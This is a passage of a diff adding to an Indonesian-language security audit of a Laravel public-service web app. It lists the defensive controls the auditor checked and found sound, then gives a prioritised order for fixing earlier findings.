+## Area yang sudah diperiksa dan terlihat aman (dicatat sebagai bukti cakupan audit, bukan asumsi)
+
+- **Mass assignment / privilege escalation** — `ResourceController::payload()`
+  membangun payload field-by-field dari `AdminRegistry::formFields()`, bukan
+  `$request->all()`; role/`additional_access` di-guard `abort_unless(...isSuperadmin())`.
+- **SQL Injection** — seluruh query pakai Eloquent/query builder; kolom
+  sort & search di `ResourceController::query()` divalidasi terhadap
+  `$meta['columns']`/`getFillable()`, tidak menerima nama kolom mentah dari
+  request.
+- **File upload** — SVG/SVGZ ditolak eksplisit (`FileUploadService::isSvg()`);
+  gambar raster di-*re-encode* penuh ke WebP (menghapus payload polyglot +
+  metadata EXIF/GPS); nama file disanitasi dari path traversal & karakter
+  berbahaya; disk `public` sebenarnya S3-compatible (Backblaze B2), bukan
+  filesystem lokal di webroot.
+- **Backup/restore** — dibatasi `isSuperadmin()`, konfirmasi dua langkah
+  (kata "RESTORE" + kode acak sekali-pakai per sesi via `hash_equals`).
+- **SSRF guard** — `SettingController::assertSafeOutboundUrl()` memvalidasi
+  skema + pola IP privat + resolusi DNS sebelum server menghubungi `base_url`
+  custom AI provider yang diisi admin.
+- **API key AI provider** — disimpan terenkripsi (`'api_key' => 'encrypted'`
+  cast) di `AiProvider` model.
+- **Auth & session** — password di-hash (`'password' => 'hashed'` cast,
+  bcrypt via `BCRYPT_ROUNDS=12`), sesi diregenerasi saat login & password
+  berubah, cookie `HttpOnly` + `SameSite=Lax` + `Secure` (saat produksi),
+  akun nonaktif (`is_active=false`) diblokir di level `AdminAccess::hasAnyPanelRole()`,
+  tidak ada user enumeration di pesan error login.
+- **IDOR sertifikat/bukti PDF publik** — route sertifikat sosialisasi memakai
+  token acak (`{token}.pdf`, dicocokkan via `where('token', $token)`, bukan ID
+  berurutan); nomor tiket (`TicketGenerator`) 8 karakter alfanumerik acak +
+  dibatasi rate limit di endpoint publik terkait.
+- **Path traversal** — `OgImageProxyController` & `ResourceController::downloadFile()`
+  (untuk validasi path-nya sendiri, terlepas dari temuan #4 soal otorisasi)
+  memvalidasi `..`, path absolut, null byte, backslash dengan benar.
+- **Sensitive data di log** — `ActivityLogger::HIDDEN` mengecualikan
+  `password`, `api_key`, `remember_token`, dll dari diff log aktivitas;
+  `ChatStreamController` sengaja tidak mencatat isi pesan warga ke log.
+- **Formula injection CSV/XLSX** — sudah disanitasi (lihat item #8).
+- **HTML sanitization konten artikel** — `HtmlSanitizer` (HTMLPurifier
+  dengan whitelist tag/atribut/skema URL) dipakai konsisten sebelum konten
+  artikel disimpan (`ResourceController::payload()`) dan dirender
+  (`{!! $kontenBersih !!}` di `berita/show.blade.php` & `admin/artikel/show.blade.php`).
+
+---
+
+## Urutan pengerjaan yang disarankan
+1. **🔴 #1, #2, #3** — perbaiki dalam 1 batch (escaping popup peta + hapus
+   `withoutVerifying()`), karena saling terkait dan berdampak langsung ke
+   pengunjung publik maupun sesi admin.
+2. **🟠 #4, #5** — perbaikan cepat, effort kecil–sedang, tutup celah akses
+   file lintas-bidang & lengkapi rate limiting yang bolong.
+3. **🟠 #6** — jadwalkan sebagai proyek tersendiri (refactor CSP bertahap).
+4. **🟡 #7, #8, #9** — proses/dokumentasi, kerjakan paralel kapan saja.
+5. **🟢 #10, #11** — opsional, prioritas paling rendah.
+
+Setelah setiap perbaikan, jalankan regresi manual pada fitur terkait (peta
+armada publik, peta GIS admin, peta objek pengawasan, dashboard admin per
+role, submit semua form pengaduan/permohonan publik, integrasi GPS vendor,
+unduh lampiran admin) sebelum deploy ke produksi.
